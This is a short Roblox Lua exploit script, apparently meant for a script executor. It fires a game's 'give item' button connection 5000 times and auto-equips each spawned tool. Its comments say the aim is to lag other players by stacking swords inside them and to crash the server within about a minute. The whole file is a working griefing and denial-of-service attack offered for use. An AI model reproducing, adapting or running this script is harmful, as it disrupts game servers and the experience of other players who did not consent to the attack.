-- / If you have enough tools you can lag people by putting the sword inside of them.
-- / This is because the CPU will calculate all the .Touched for each sword and is really bad lol
-- / Although, if you run the 2nd cut of this, when you have all your swords, the server will crash after a minute passes
local plr = game:GetService("Players").LocalPlayer
local remote = getconnections(plr.PlayerGui.ManagerGui.ServerSettingFrame.GiveButton.MouseButton1Click)[1]

if _G.C1 then
    _G.C1:Disconnect()
end

_G.C1 = plr.Backpack.ChildAdded:Connect(function(item)
	if item.ClassName == "Tool" and plr.Character then
		wait()
		item.Parent = plr.Character
	end
end)

for i=1,5000 do
	wait()
	remote:Fire()
end
